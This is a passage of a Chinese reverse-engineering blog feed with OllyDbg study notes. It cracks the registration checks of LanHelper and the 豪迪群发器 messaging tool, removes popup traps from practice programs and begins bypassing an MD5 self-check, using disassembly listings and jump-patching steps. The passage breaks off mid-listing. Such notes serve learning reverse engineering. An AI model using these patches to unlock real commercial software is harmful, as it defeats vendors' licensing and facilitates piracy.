title="注册码有误"><p>拿去查壳，没有壳，是Delphi写的程序。载入OD搜索字符串“注册码”没有找到。没关系，谁让它是Delphi写的呢？把它载入Delphi Decompiler，点击“Procedures”(过程)，找到有关注册字样的单元名。注册的窗体有两个文本框和三个按钮，找到最符合的注册窗体。</p><img src="/posts/f398dcca/10.2.png" class="" title="dede找注册窗体"><p>猜测<code>Button1Click</code>是“确定”按钮，因为“取消”就会返回到父窗口，相当于关闭嘛，没有按钮可以理解。为了验证我们的猜想，双击<code>Button1Click</code>进去找到第一条汇编指令，地址为<code>004DCB40</code>。</p><img src="/posts/f398dcca/10.3.png" class="" title="按钮首地址"><p>回到OD，Ctrl + G输入地址，下断运行。输入名称、注册码后点击确定，OD成功停在断点处，说明找对了。</p><p>F8往下运行。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">004DCB6D   .  E8 5616FAFF   call LanHelpe.0047E1C8</span><br><span class="line">004DCB72   .  8B45 B8       mov eax,dword ptr ss:[ebp-0x48]</span><br><span class="line">004DCB75   .  8D55 BC       lea edx,dword ptr ss:[ebp-0x44]</span><br><span class="line">004DCB78   .  E8 47CCF2FF   call LanHelpe.004097C4                   ;  获取用户名</span><br><span class="line">004DCB7D   .  837D BC 00    cmp dword ptr ss:[ebp-0x44],0x0          ;  判断用户名是否为空</span><br><span class="line">004DCB81   .  74 22         je short LanHelpe.004DCBA5</span><br><span class="line">004DCB83   .  8D55 B0       lea edx,dword ptr ss:[ebp-0x50]</span><br><span class="line">004DCB86   .  8B45 FC       mov eax,dword ptr ss:[ebp-0x4]</span><br><span class="line">004DCB89   .  8B80 04030000 mov eax,dword ptr ds:[eax+0x304]</span><br><span class="line">004DCB8F   .  E8 3416FAFF   call LanHelpe.0047E1C8</span><br><span class="line">004DCB94   .  8B45 B0       mov eax,dword ptr ss:[ebp-0x50]</span><br><span class="line">004DCB97   .  8D55 B4       lea edx,dword ptr ss:[ebp-0x4C]</span><br><span class="line">004DCB9A   .  E8 25CCF2FF   call LanHelpe.004097C4                   ;  获取假码</span><br><span class="line">004DCB9F   .  837D B4 00    cmp dword ptr ss:[ebp-0x4C],0x0          ;  判断假码是否为空</span><br><span class="line">004DCBA3   .  75 44         jnz short LanHelpe.004DCBE9</span><br><span class="line">004DCBA5   &gt;  8D4D F0       lea ecx,dword ptr ss:[ebp-0x10]</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">004DCBE9   &gt; \8D55 A8       lea edx,dword ptr ss:[ebp-0x58]</span><br><span class="line">004DCBEC   .  8B45 FC       mov eax,dword ptr ss:[ebp-0x4]</span><br><span class="line">004DCBEF   .  8B80 04030000 mov eax,dword ptr ds:[eax+0x304]</span><br><span class="line">004DCBF5   .  E8 CE15FAFF   call LanHelpe.0047E1C8</span><br><span class="line">004DCBFA   .  8B45 A8       mov eax,dword ptr ss:[ebp-0x58]</span><br><span class="line">004DCBFD   .  50            push eax</span><br><span class="line">004DCBFE   .  8D55 A4       lea edx,dword ptr ss:[ebp-0x5C]</span><br><span class="line">004DCC01   .  8B45 FC       mov eax,dword ptr ss:[ebp-0x4]</span><br><span class="line">004DCC04   .  8B80 00030000 mov eax,dword ptr ds:[eax+0x300]</span><br><span class="line">004DCC0A   .  E8 B915FAFF   call LanHelpe.0047E1C8</span><br><span class="line">004DCC0F   .  8B45 A4       mov eax,dword ptr ss:[ebp-0x5C]</span><br><span class="line">004DCC12   .  5A            pop edx                                  ;  0012F338</span><br><span class="line">004DCC13   .  E8 9C270000   call LanHelpe.004DF3B4                   ;  用户名和假码放到寄存器，这个是关键call</span><br><span class="line">004DCC18      84C0          test al,al                               ;  比较al的值</span><br><span class="line">004DCC1A      0F84 F4030000 je LanHelpe.004DD014                     ;  关键跳</span><br></pre></td></tr></table></figure><p>运行到关键跳处修改Z标志位，F9运行，发现成功注册，但程序是重启验证类型的。</p><img src="/posts/f398dcca/10.4.png" class="" title="注册成功"><p>那我们将关键跳nop掉作为2.exe，修改al的值作为3.exe试试。</p><p>意料之中，2.exe每次都需要注册，根本就行不通。3.exe竟然说注册码有误，我们不是跳过了吗？载入OD发现al确实是变成1，但是je跳转还是实现了。好吧既然这样就进入关键call一探究竟。</p><p>输入用户名v5le0n9，假码l30n9ry0n。进入关键call。</p><img src="/posts/f398dcca/10.5.png" class="" title="算法分析"><img src="/posts/f398dcca/10.6.png" class="" title="算法分析"><img src="/posts/f398dcca/10.7.png" class="" title="算法分析"><p>将这循环跑了6次之后，可以知道真码前6位固定为LH4A8N。循环结束后，比较dl的值，如果dl为0则跳转到eax清零处。</p><p>重新载入，将假码的前6位设置为<code>LH4A8N</code>再分析。去到比较dl的值处，现在已经不为0了。继续往下走，看到一些红色指令。</p><p>fild和fstp都是x86指令，fild是将整数转化为长双精FP80压栈(压到st0)，<br>fstp是将弹栈指令，将st0弹出。ebp始终指向栈顶，ebp是在堆栈中寻址用的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">004DF49C   .  84D2             test dl,dl</span><br><span class="line">004DF49E   .  0F84 F8030000    je LanHelpe.004DF89C</span><br><span class="line">004DF4A4   .  33C0             xor eax,eax</span><br><span class="line">004DF4A6   .  8945 E0          mov dword ptr ss:[ebp-0x20],eax</span><br><span class="line">004DF4A9   .  8945 E4          mov dword ptr ss:[ebp-0x1C],eax</span><br><span class="line">004DF4AC   .  8B45 F8          mov eax,dword ptr ss:[ebp-0x8]           ;  eax是假码</span><br><span class="line">004DF4AF   .  8A58 06          mov bl,byte ptr ds:[eax+0x6]             ;  将第7位赋值给bl</span><br><span class="line">004DF4B2   .  33C0             xor eax,eax                              ;  eax清零</span><br><span class="line">004DF4B4   .  8AC3             mov al,bl                                ;  bl再赋值给al</span><br><span class="line">004DF4B6   .  8945 A0          mov dword ptr ss:[ebp-0x60],eax          ;  将假码第7位压入[ebp-0x60]</span><br><span class="line">004DF4B9   .  DB45 A0          fild dword ptr ss:[ebp-0x60]             ;  将第7位放入st0中</span><br><span class="line">004DF4BC   .  83C4 F4          add esp,-0xC                             ;  更新栈顶指针</span><br><span class="line">004DF4BF   .  DB3C24           fstp tbyte ptr ss:[esp]                  ;  pop栈顶数据</span><br><span class="line">004DF4C2   .  9B               wait</span><br><span class="line">004DF4C3   .  68 FE3F0000      push 0x3FFE</span><br><span class="line">004DF4C8   .  68 BD529691      push 0x919652BD</span><br><span class="line">004DF4CD   .  68 3411363C      push 0x3C361134</span><br><span class="line">004DF4D2   .  E8 9D1AF5FF      call LanHelpe.00430F74                   ;  将上面3个参数入栈调用F74</span><br></pre></td></tr></table></figure><p>后面也有很多调用F74的，所以进去F74分析一下。</p><img src="/posts/f398dcca/10.8.png" class="" title="算法分析"><img src="/posts/f398dcca/10.9.png" class="" title="算法分析"><p>…又要进去BF4分析一下，我真看不懂啊救命</p><h1 id="NO-5-NET系列教程"><a href="#NO-5-NET系列教程" class="headerlink" title="NO.5 .NET系列教程"></a>NO.5 .NET系列教程</h1><p>Blue的实战软件全都过期了，所以我找了别的教程自力更生。</p><p><a href="https://v5le0n9.github.io/posts/784f7e1d.html">.Net零基础破解教程</a></p><h1 id="NO-6-去软件弹窗系列教程"><a href="#NO-6-去软件弹窗系列教程" class="headerlink" title="NO.6 去软件弹窗系列教程"></a>NO.6 去软件弹窗系列教程</h1><h2 id="第一课：弹窗暗桩"><a href="#第一课：弹窗暗桩" class="headerlink" title="第一课：弹窗暗桩"></a>第一课：弹窗暗桩</h2><p>运行一下程序，弹出网页。程序无壳，查找一下字符串，定位关键代码处。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">00401004  /.  55            push ebp</span><br><span class="line">00401005  |.  8BEC          mov ebp,esp</span><br><span class="line">00401007  |.  6A 00         push 0x0</span><br><span class="line">00401009  |.  68 106B4600   push 第一课.00466B10                        ;  恭喜你：暗桩没有触发</span><br><span class="line">0040100E  |.  6A FF         push -0x1</span><br><span class="line">00401010  |.  6A 08         push 0x8</span><br><span class="line">00401012  |.  68 04000116   push 0x16010004</span><br><span class="line">00401017  |.  68 01000152   push 0x52010001</span><br><span class="line">0040101C  |.  E8 A0000000   call 第一课.004010C1</span><br><span class="line">00401021  |.  83C4 18       add esp,0x18</span><br><span class="line">00401024  |.  E8 04000000   call 第一课.0040102D;暗桩关键call，nop即可</span><br><span class="line">00401029  |.  8BE5          mov esp,ebp</span><br><span class="line">0040102B  |.  5D            pop ebp                                  ;  kernel32.7C817077</span><br><span class="line">0040102C  \.  C3            retn</span><br><span class="line">0040102D  /$  55            push ebp</span><br><span class="line">0040102E  |.  8BEC          mov ebp,esp</span><br><span class="line">00401030  |.  68 04000080   push 0x80000004</span><br><span class="line">00401035  |.  6A 00         push 0x0</span><br><span class="line">00401037  |.  68 256B4600   push 第一课.00466B25                        ;  www.52pojie.cn</span><br><span class="line">0040103C  |.  68 01000000   push 0x1</span><br><span class="line">00401041  |.  B8 01000000   mov eax,0x1</span><br><span class="line">00401046  |.  BB 10584400   mov ebx,第一课.00445810</span><br><span class="line">0040104B  |.  E8 77000000   call 第一课.004010C7</span><br><span class="line">00401050  |.  83C4 10       add esp,0x10</span><br><span class="line">00401053  |.  6A 00         push 0x0</span><br><span class="line">00401055  |.  68 346B4600   push 第一课.00466B34                        ;  失败了！暗桩已经触发</span><br></pre></td></tr></table></figure><h2 id="第二课：再探弹窗暗桩"><a href="#第二课：再探弹窗暗桩" class="headerlink" title="第二课：再探弹窗暗桩"></a>第二课：再探弹窗暗桩</h2><p>这次是两个弹网页。依旧无壳，载入OD，发现查找字符串无果。查找所有模块间的调用，找到弹网页的函数<code>ShellExecuteA</code>，下断。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">00445DD0  /$  68 F8114800   push 第二课.004811F8                        ; /Microsoft Internet Explorer</span><br><span class="line">00445DD5  |.  6A 00         push 0x0                                 ; |Class = 0x0</span><br><span class="line">00445DD7  |.  6A 00         push 0x0                                 ; |hAfterWnd = NULL</span><br><span class="line">00445DD9  |.  6A 00         push 0x0                                 ; |hParent = NULL</span><br><span class="line">00445DDB  |.  FF15 40654600 call dword ptr ds:[&lt;&amp;USER32.FindWindowEx&gt;; \FindWindowExA</span><br><span class="line">00445DE1  |.  8B4C24 04     mov ecx,dword ptr ss:[esp+0x4]</span><br><span class="line">00445DE5  |.  6A 01         push 0x1                                 ; /IsShown = 0x1</span><br><span class="line">00445DE7  |.  6A 00         push 0x0                                 ; |DefDir = NULL</span><br><span class="line">00445DE9  |.  6A 00         push 0x0                                 ; |Parameters = NULL</span><br><span class="line">00445DEB  |.  51            push ecx                                 ; |FileName = &quot;&quot;</span><br><span class="line">00445DEC  |.  68 F0114800   push 第二课.004811F0                        ; |open</span><br><span class="line">00445DF1  |.  50            push eax                                 ; |hWnd = 001631B8</span><br><span class="line">00445DF2  |.  FF15 84634600 call dword ptr ds:[&lt;&amp;SHELL32.ShellExecut&gt;; \ShellExecuteA</span><br><span class="line">00445DF8  \.  C2 0400       retn 0x4</span><br></pre></td></tr></table></figure><p>执行到返回，程序弹出一个网页。再经过这里一次，程序弹出第二个网页。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">00445CD5   .  E8 3A150100   call 第二课.00457214</span><br><span class="line">00445CDA      8B4424 00     mov eax,dword ptr ss:[esp]</span><br><span class="line">00445CDE      8D4C24 04     lea ecx,dword ptr ss:[esp+0x4]</span><br><span class="line">00445CE2      50            push eax</span><br><span class="line">00445CE3      E8 E8000000   call 第二课.00445DD0                        ;  暗桩</span><br><span class="line">00445CE8   .  8D4C24 00     lea ecx,dword ptr ss:[esp]</span><br></pre></td></tr></table></figure><p>所以只要将2-5行代码都nop掉，两个弹窗都没有了。但运行程序还是说暗桩已经触发。那有没有好一点的办法让它说没有触发呢？</p><p>在数据窗口Ctrl+B搜索ASCII码“ www.52pojie.cn ”，下内存访问断点。运行单步</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">004010C4  /$  55            push ebp</span><br><span class="line">004010C5  |.  8BEC          mov ebp,esp</span><br><span class="line">004010C7  |.  81EC 04000000 sub esp,0x4</span><br><span class="line">004010CD  |.  68 010100A0   push 0xA0000101</span><br><span class="line">004010D2  |.  6A 00         push 0x0</span><br><span class="line">004010D4  |.  68 F87B4600   push 第二课.00467BF8</span><br><span class="line">004010D9  |.  68 01000000   push 0x1</span><br><span class="line">004010DE  |.  BB 10144000   mov ebx,第二课.00401410</span><br><span class="line">004010E3  |.  E8 B4010000   call 第二课.0040129C</span><br><span class="line">004010E8  |.  83C4 10       add esp,0x10</span><br><span class="line">004010EB  |.  8945 FC       mov [local.1],eax</span><br><span class="line">004010EE  |.  68 04000080   push 0x80000004</span><br><span class="line">004010F3  |.  6A 00         push 0x0</span><br><span class="line">004010F5  |.  8B45 FC       mov eax,[local.1]</span><br><span class="line">004010F8  |.  85C0          test eax,eax</span><br><span class="line">004010FA  |.  75 05         jnz short 第二课.00401101</span><br><span class="line">004010FC  |.  B8 0E7C4600   mov eax,第二课.00467C0E                     ;  ā</span><br><span class="line">00401101  |&gt;  50            push eax</span><br><span class="line">00401102  |.  68 01000000   push 0x1</span><br><span class="line">00401107  |.  B8 01000000   mov eax,0x1</span><br><span class="line">0040110C  |.  BB B05C4400   mov ebx,第二课.00445CB0</span><br><span class="line">00401111  |.  E8 8C010000   call 第二课.004012A2                        ;  第一次弹窗</span><br></pre></td></tr></table></figure><p>继续单步，<code>004010C4</code>就是第一次弹窗的位置，所以将这两个call指令nop掉即可。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">004010A9  |.  83C4 04       add esp,0x4</span><br><span class="line">004010AC  |&gt;  E8 13000000   call 第二课.004010C4                        ;  第一次弹窗</span><br><span class="line">004010B1  |.  E8 C3000000   call 第二课.00401179</span><br><span class="line">004010B6  |.  E8 C5000000   call 第二课.00401180                        ;  第二次弹窗</span><br><span class="line">004010BB  |.  E8 75010000   call 第二课.00401235</span><br></pre></td></tr></table></figure><p>这次它说暗桩没有触发。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;NO.1~NO.3在&lt;a href=&quot;https://v5le0n9.github.io/posts/e2d652c5.html&quot;&gt;第一课——脱壳基础&lt;/a&gt;就已经实践完了，所以这个笔记从NO.4开始。这个笔记是在&lt;a href=&quot;https://v5le0n9.github.io/posts/33a085c7.html&quot;&gt;调试器使用教程&lt;/a&gt;的基础上讲解，所以一定要保证自己已经了解OD的基本操作才推荐看这个笔记，但绝对会比论坛的大牛们讲解的详细。&lt;/p&gt;</summary>
    
    
    
    <category term="Windows逆向" scheme="http://example.com/categories/Windows%E9%80%86%E5%90%91/"/>
    
    
    <category term="OllyDbg" scheme="http://example.com/tags/OllyDbg/"/>
    
    <category term="吾爱破解培训" scheme="http://example.com/tags/%E5%90%BE%E7%88%B1%E7%A0%B4%E8%A7%A3%E5%9F%B9%E8%AE%AD/"/>
    
  </entry>
  
  <entry>
    <title>第四课——去程序自校验</title>
    <link href="http://example.com/posts/65ab04eb.html"/>
    <id>http://example.com/posts/65ab04eb.html</id>
    <published>2022-04-05T01:29:28.172Z</published>
    <updated>2022-04-11T05:26:04.936Z</updated>
    
    <content type="html"><![CDATA[<p>破解豪迪群发器。</p><p>打开注册页面，随便输入注册码，会出现以下：</p><span id="more"></span><img src="/posts/65ab04eb/%E8%B1%AA%E8%BF%AA%E6%B3%A8%E5%86%8C.jpg" class="" title="豪迪注册"><p>程序无壳，直接破解。右键-&gt;中文搜索引擎-&gt;智能搜索。找到“已注册版本”，应该是主页页面中央的红字部分。点进去，发现上面有比较和跳转指令。在跳转指令处下断，运行程序，点击注册，发现程序停在断点处，说明找对地方了。这个对比语句比较的是<code>0x579F24</code>这个所指向的全局变量。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">00541870  |.  803D 249F5700&gt;cmp byte ptr ds:[0x579F24],0x0</span><br><span class="line">00541877  |.  74 10         je short qqqf.00541889</span><br><span class="line">00541879  |.  BA F4185400   mov edx,qqqf.005418F4                    ;  已注册版本</span><br></pre></td></tr></table></figure><p>右键-&gt;查找-&gt;所有常量，输入<code>0x579F24</code>。OD跳到所有调用过<code>0x579F24</code>的指令，右键-&gt;在每个命令上设置断点。快速定位第一个赋值点。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">参考位于 qqqf:CODE 到常量 0x579F24</span><br><span class="line">地址       反汇编                                    注释</span><br><span class="line">0054135F   mov byte ptr ds:[0x579F24],0x0            ds:[00579F24]=00</span><br><span class="line">00541366   cmp byte ptr ds:[0x579F24],0x0            ds:[00579F24]=00</span><br><span class="line">0054147C   mov byte ptr ds:[0x579F24],0x0            ds:[00579F24]=00</span><br><span class="line">00541650   mov byte ptr ds:[0x579F24],dl</span><br><span class="line">0054169E   mov byte ptr ds:[0x579F24],al</span><br><span class="line">005416A3   cmp byte ptr ds:[0x579F24],0x0            ds:[00579F24]=00</span><br><span class="line">00541870   cmp byte ptr ds:[0x579F24],0x0            ds:[00579F24]=00</span><br><span class="line">0056AFB0   push ebp                                  (初始 CPU 选择)</span><br></pre></td></tr></table></figure><p>重载，去到第一个断点处。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">0054163B   .  E8 842FECFF   call qqqf.004045C4</span><br><span class="line">00541640   .  83F8 18       cmp eax,0x18</span><br><span class="line">00541643   .  74 09         je short qqqf.0054164E;eax=0x18则给dl赋值为1</span><br><span class="line">00541645   .  83F8 0C       cmp eax,0xC</span><br><span class="line">00541648   .  74 04         je short qqqf.0054164E;eax=0xC也可以给dl赋值为1</span><br><span class="line">0054164A   .  33D2          xor edx,edx;eax不等于0x18或0xc则给dl赋值为0</span><br><span class="line">0054164C   .  EB 02         jmp short qqqf.00541650</span><br><span class="line">0054164E   &gt;  B2 01         mov dl,0x1</span><br><span class="line">00541650   &gt;  8815 249F5700 mov byte ptr ds:[0x579F24],dl;第一个断点处，将dl的值赋给它</span><br><span class="line">00541656   .  83F8 0C       cmp eax,0xC</span><br><span class="line">00541659   .  75 48         jnz short qqqf.005416A3;如果eax不等于0xC则跳转</span><br></pre></td></tr></table></figure><p>首先假设eax=0x18(在注册页面上输入0x18位注册码)的情况，即最后一个跳转指令要跳转。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">005416A3   &gt; \803D 249F5700&gt;cmp byte ptr ds:[0x579F24],0x0</span><br><span class="line">005416AA   .  75 05         jnz short qqqf.005416B1;跳转实现</span><br></pre></td></tr></table></figure><p>Shift+F9运行，去到第二个断点处。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0054135A  |.  83F8 0C       cmp eax,0xC</span><br><span class="line">0054135D  |.  74 07         je short qqqf.00541366;eax=0xC跳转，否则会执行赋0语句</span><br><span class="line">0054135F  |.  C605 249F5700&gt;mov byte ptr ds:[0x579F24],0x0</span><br><span class="line">00541366  |&gt;  803D 249F5700&gt;cmp byte ptr ds:[0x579F24],0x0</span><br></pre></td></tr></table></figure><p>Shift+F9运行，继续去到第三个断点处。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">00541870  |.  803D 249F5700&gt;cmp byte ptr ds:[0x579F24],0x0</span><br><span class="line">00541877  |.  74 10         je short qqqf.00541889;eax=0x18时会执行赋0语句，所以会跳过“已注册版本”</span><br><span class="line">00541879  |.  BA F4185400   mov edx,qqqf.005418F4                    ;  已注册版本</span><br><span class="line">0054187E  |.  8B83 FC020000 mov eax,dword ptr ds:[ebx+0x2FC]</span><br><span class="line">00541884  |.  E8 F77CFBFF   call qqqf.004F9580</span><br><span class="line">00541889  |&gt;  33C0          xor eax,eax</span><br></pre></td></tr></table></figure><p>重载OD，在注册页面上输入0xC位注册码，运行。第一个断点没问题，去到第二个断点处(此时这第二个断点与上次输入0x18的第二个断点已经不一样了)。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">00541696   . /7F 04                 jg short qqqf.0054169C</span><br><span class="line">00541698   &gt; |33C0                  xor eax,eax</span><br><span class="line">0054169A   . |EB 02                 jmp short qqqf.0054169E</span><br><span class="line">0054169C   &gt; \B0 01                 mov al,0x1</span><br><span class="line">0054169E      A2 249F5700           mov byte ptr ds:[0x579F24],al;此时al的值为0</span><br><span class="line">005416A3      803D 249F5700 00      cmp byte ptr ds:[0x579F24],0x0</span><br><span class="line">005416AA      75 05                 jnz short qqqf.005416B1;这里一定让它跳转，否则注册失败</span><br></pre></td></tr></table></figure><p>修改第一行的跳转指令，使al为1。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jg short qqqf.0054169C=&gt;jmp short qqqf.0054169C</span><br></pre></td></tr></table></figure><p>保存一下，载入新程序再下断运行，发现运行到<code>54169E</code>时al还是为0。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">0054168C     /75 0A         jnz short qqqf1.00541698</span><br><span class="line">0054168E   . |8B07          mov eax,dword ptr ds:[edi]</span><br><span class="line">00541690   . |E8 177EFCFF   call qqqf1.005094AC</span><br><span class="line">00541695   . |40            inc eax</span><br><span class="line">00541696   . |EB 04         jmp short qqqf1.0054169C;修改过</span><br><span class="line">00541698   &gt; \33C0          xor eax,eax</span><br><span class="line">0054169A   .  EB 02         jmp short qqqf1.0054169E</span><br><span class="line">0054169C   &gt;  B0 01         mov al,0x1</span><br><span class="line">0054169E   &gt;  A2 249F5700   mov byte ptr ds:[0x579F24],al</span><br><span class="line">005416A3   &gt;  803D 249F5700&gt;cmp byte ptr ds:[0x579F24],0x0</span><br></pre></td></tr></table></figure><p>猜测<code>54168C</code>的跳转指令绕过了我们刚才修改过的指令，再<code>54168C</code>处下断，重载，运行到这里果然跳转实现了。那将<code>54168C</code>改为nop，让它执行<code>541696</code>使al为1。</p><p>保存，运行一下，发现左下角显示“已注册！”，接着显示“正在验证…”，“验证失败！”。</p><img src="/posts/65ab04eb/%E9%AA%8C%E8%AF%81.jpg" class="" title="验证失败"><p>载入OD，查找字符串“验证失败！”处，查看上下代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">00540B2A  |&gt; \807D EB 00    cmp byte ptr ss:[ebp-0x15],0x0</span><br><span class="line">00540B2E  |.  75 68         jnz short qqqf2.00540B98</span><br><span class="line">00540B30  |.  B8 E00E5400   mov eax,qqqf2.00540EE0                   ;  验证失败！</span><br><span class="line">00540B35  |.  E8 3ED00100   call qqqf2.0055DB78</span><br></pre></td></tr></table></figure><p>尝试将跳转指令修改一下。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jnz short qqqf2.00540B98=&gt;jmp short qqqf2.00540B98</span><br></pre></td></tr></table></figure><p>F9运行发现经过验证后显示“已注册！”字样，说明验证成功。而且点击注册那里也显示“已注册版本”。</p><p>由于每次等待验证的时间都非常长，所以也可以直接在函数段首<code>retn</code>，绕过验证过程。</p><p>当运用“插入文件”、“插入其他”、“插入图片”功能时，都显示乱码。反正就是很多功能都不能用。</p><img src="/posts/65ab04eb/%E6%8F%92%E5%85%A5%E5%85%B6%E4%BB%96.jpg" class="" title="插入其他"><p>这就涉及到程序自校验的问题。这个程序是什么类型的自校验呢？将原程序拉进WinHEX，在程序末尾填充00的任意一个地方修改为01保存，使用以上功能时还是乱码，很有可能是MD5自校验。</p><p>从 <a href="https://www.52pojie.cn/thread-14986-1-1.html">https://www.52pojie.cn/thread-14986-1-1.html</a> 下载脱壳脚本。将已注册版本的程序载入OD，插件-&gt;ODbgScript-&gt;打开，选择脱壳脚本里的各语言按钮事件-&gt;Delphi &amp; VB事件断点查找脚本。可以在<code>B</code>模块看到自动下了很多断点。Shift+F9运行起来，在程序界面点击“插入其他”，OD停在某断点处。因为还没有显示下拉菜单，更别提是自校验的过程了，所以这个断点可以去掉。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">00479DF4  |.  FF93 20010000 call dword ptr ds:[ebx+0x120]            ;  qqqf3_1.0056934C</span><br></pre></td></tr></table></figure><p>F9运行，在程序界面点击插入其他-&gt;插入随机字母，OD停在下个断点处。这个函数才是触发自校验过程的函数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0048B2D6   .  FF93 88000000 call dword ptr ds:[ebx+0x88]             ;  qqqf3_1.00567ED8</span><br></pre></td></tr></table></figure><p>F7跟进去。这个函数里也有挺多个call指令，到底哪个是MD5自校验函数呢？我们知道，MD5自校验需要读取文件来计算MD5值，所以如果在call里面看到有关文件的API函数，很大可能这个函数是MD5自校验的关键函数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span 